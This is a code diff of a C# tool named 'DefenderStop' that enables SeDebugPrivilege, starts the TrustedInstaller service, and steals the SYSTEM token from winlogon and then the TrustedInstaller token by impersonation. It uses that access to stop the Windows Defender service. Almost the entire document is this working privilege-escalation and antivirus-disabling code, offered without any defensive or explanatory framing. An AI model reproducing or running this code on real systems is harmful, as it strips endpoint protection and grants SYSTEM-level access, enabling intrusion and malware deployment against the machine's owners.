@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
@@ -13,19 +13,16 @@ namespace DefenderStop
     {
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);
+        static extern bool OpenProcessToken(IntPtr ProcessHandle,UInt32 DesiredAccess, out IntPtr TokenHandle);
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool RevertToSelf();
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
         public extern static bool CloseHandle(IntPtr handle);
         [DllImport("advapi32.dll", SetLastError = true)]
-
+        
         static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr GetCurrentProcess();
 
 
         public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
@@ -112,6 +109,20 @@ namespace DefenderStop
             POWEREVENT = 0x00000040,
             SESSIONCHANGE = 0x00000080,
         }
+
+              
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SERVICE_STATUS
+        {
+            public int serviceType;
+            public int currentState;
+            public int controlsAccepted;
+            public int win32ExitCode;
+            public int serviceSpecificExitCode;
+            public int checkPoint;
+            public int waitHint;
+        }
+
         public enum PrivilegeNames
         {
             SeCreateTokenPrivilege,
@@ -151,16 +162,11 @@ namespace DefenderStop
             SeCreateSymbolicLinkPrivilege
         }
 
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SERVICE_STATUS
+        internal struct TokPriv1Luid
         {
-            public int serviceType;
-            public int currentState;
-            public int controlsAccepted;
-            public int win32ExitCode;
-            public int serviceSpecificExitCode;
-            public int checkPoint;
-            public int waitHint;
+            public int Count;
+            public long Luid;
+            public int Attr;
         }
 
         const Int32 ANYSIZE_ARRAY = 1;
@@ -177,14 +183,12 @@ namespace DefenderStop
             public LUID Luid;
             public UInt32 Attributes;
         }
-        public struct TOKEN_PRIVILEGES
-        {
-            public int PrivilegeCount;
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]
-            public LUID_AND_ATTRIBUTES[] Privileges;
-        }
+        [DllImport("advapi32.dll", SetLastError = true)]
+        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
 
-        static void Get_username()
+        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
+        public static void get_username()
         {
             StringBuilder Buffer = new StringBuilder(64);
             int nSize = 64;
@@ -203,17 +207,12 @@ namespace DefenderStop
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ControlService(IntPtr hService, SERVICE_CONTROL dwControl, ref SERVICE_STATUS lpServiceStatus);
-
-        [DllImport("advapi32.dll")]
-        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, ref LUID lpLuid);
-
-        [DllImport("advapi32.dll", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 Zero, IntPtr Null1, IntPtr Null2);
-        static void Start_trustedinstaller_service()
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetCurrentProcess();
+        public static void start_trustedinstaller_service()
         {
             IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
-            Console.WriteLine("Handle to scmmanager: " + SCMHandle.ToString("X"));
+            
             if (SCMHandle == IntPtr.Zero)
             {
                 Console.WriteLine("OpenSCManager failed!");
@@ -221,8 +220,8 @@ namespace DefenderStop
             }
             Console.WriteLine("OpenSCManager success!");
             string ServiceName = "TrustedInstaller";
-            IntPtr schService = OpenService(SCMHandle, ServiceName, (uint)SERVICE_ACCESS.SERVICE_START);
-            Console.WriteLine("Handle to schService: " + schService.ToString("X"));
+            IntPtr schService = OpenService(SCMHandle, ServiceName, (uint) SERVICE_ACCESS.SERVICE_START);
+            
             bool bResult = StartService(schService, 0, null);
             if (bResult)
             {
@@ -232,49 +231,48 @@ namespace DefenderStop
             {
                 Console.WriteLine("TrustedInstaller service cannot be started!");
             }
-
+        
             Thread.Sleep(2000);
             CloseHandle(schService);
             CloseHandle(SCMHandle);
 
         }
-
+        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
+        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
+       
         public static bool EnableDebugPrivilege()
         {
-            IntPtr hToken;
-            bool res = OpenProcessToken(GetCurrentProcess(), 0x0020, out hToken);
-            if (!res)
+            try
             {
-                return false;
-            }
-
-            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
-            LUID_AND_ATTRIBUTES luid_attrib = new LUID_AND_ATTRIBUTES();
-            string t = string.Empty;
-            res = LookupPrivilegeValue(t, "SeDebugPrivilege", ref luid_attrib.Luid);
-            tp.PrivilegeCount = 1;
-            tp.Privileges[0].Attributes = (UInt32)0x00000002;
-            tp.Privileges[0].Luid = luid_attrib.Luid;
-            if (!res)
-            {
-                return false;
-            }
-
-            res = AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
-            if (!res)
-            {
-                return false;
-            }
-            else
-            {
+                bool retVal;
+                TokPriv1Luid tp;
+                IntPtr hproc = GetCurrentProcess();
+                IntPtr htok = IntPtr.Zero;
+                retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out htok);
+                tp.Count = 1;
+                tp.Luid = 0;
+                tp.Attr = SE_PRIVILEGE_ENABLED;
+                retVal = LookupPrivilegeValue(null, "SeDebugPrivilege", ref tp.Luid);
+                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+                Console.WriteLine("SeDebugPrivilege enabled: " + retVal);
                 return true;
+            }
+            catch (Exception ex)
+            {
+                throw ex;                
             }
 
         }
-        static void Escalate_to_system()
+
+        public static void escalate_to_system()
         {
             //check if SE_DEBUG_Privilege is enabled
-
+            bool res = EnableDebugPrivilege();
+            if (!res)
+            {
+                Console.WriteLine("SeDebugPrivilege failed");
+                Environment.Exit(1);
+            }
 
             //impersonate using winlogon.exe SYSTEM token
             Process[] processlist = Process.GetProcesses();
@@ -284,7 +282,7 @@ namespace DefenderStop
                 if (theProcess.ProcessName == "winlogon")
                 {
                     bool token = OpenProcessToken(theProcess.Handle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out tokenHandle);
-                    if (!token)
+                    if(!token)
                     {
                         Console.WriteLine("OpenProcessToken Failed!");
                         return;
@@ -293,17 +291,16 @@ namespace DefenderStop
                     {
                         token = ImpersonateLoggedOnUser(tokenHandle);
                         Console.Write("User after impersonation: ");
-                        Get_username();
-                        Escalate_to_trustedinstaller();
+                        get_username();                        
                     }
                     CloseHandle(theProcess.Handle);
                 }
             }
             CloseHandle(tokenHandle);
-
+            
         }
 
-        static void Escalate_to_trustedinstaller()
+        public static void escalate_to_trustedinstaller()
         {
             //impersonate using trustedintaller.exe token
             Process[] processlist = Process.GetProcesses();
@@ -321,21 +318,18 @@ namespace DefenderStop
                     else
                     {
                         token = ImpersonateLoggedOnUser(tokenHandle);
-                        Console.Write("User after impersonation: ");
-                        Get_username();
-                        Stop_defender_service();
+                        Console.Write("Trusted Installer impersonated!");                        
                     }
                     CloseHandle(theProcess.Handle);
-                }
+                }               
             }
             CloseHandle(tokenHandle);
 
         }
 
-        static void Stop_defender_service()
+        public static void stop_defender_service()
         {
             IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
-            Console.WriteLine("Handle to scmmanager: " + SCMHandle.ToString("X"));
             if (SCMHandle == IntPtr.Zero)
             {
                 Console.WriteLine("OpenSCManager failed!");
@@ -343,8 +337,7 @@ namespace DefenderStop
             }
             Console.WriteLine("OpenSCManager success!");
             string ServiceName = "WinDefend";
-            IntPtr schService = OpenService(SCMHandle, ServiceName, (uint)(SERVICE_ACCESS.SERVICE_STOP | SERVICE_ACCESS.SERVICE_QUERY_STATUS | SERVICE_ACCESS.SERVICE_ENUMERATE_DEPENDENTS));
-            Console.WriteLine("Handle to schService: " + schService.ToString("X"));
+            IntPtr schService = OpenService(SCMHandle, ServiceName, (uint) (SERVICE_ACCESS.SERVICE_STOP | SERVICE_ACCESS.SERVICE_QUERY_STATUS | SERVICE_ACCESS.SERVICE_ENUMERATE_DEPENDENTS));
             SERVICE_STATUS ssp = new SERVICE_STATUS();
             bool bResult = ControlService(schService, SERVICE_CONTROL.STOP, ref ssp);
             if (bResult)
@@ -359,23 +352,17 @@ namespace DefenderStop
             Thread.Sleep(2000);
             CloseHandle(schService);
             CloseHandle(SCMHandle);
-
-
         }
 
-
-        static void Main()
+        public static void Main(string[] args)
         {
-            bool res = EnableDebugPrivilege();
-            if (!res)
-            {
-                Console.WriteLine("SeDebugPrivilege failed");
-                Environment.Exit(1);
-            }
             Console.Write("Original user:");
-            Get_username();
-            Start_trustedinstaller_service();
-            Escalate_to_system();
+            get_username();
+            start_trustedinstaller_service();
+            escalate_to_system();
+            escalate_to_trustedinstaller();
+            stop_defender_service();
+
         }
     }
 }
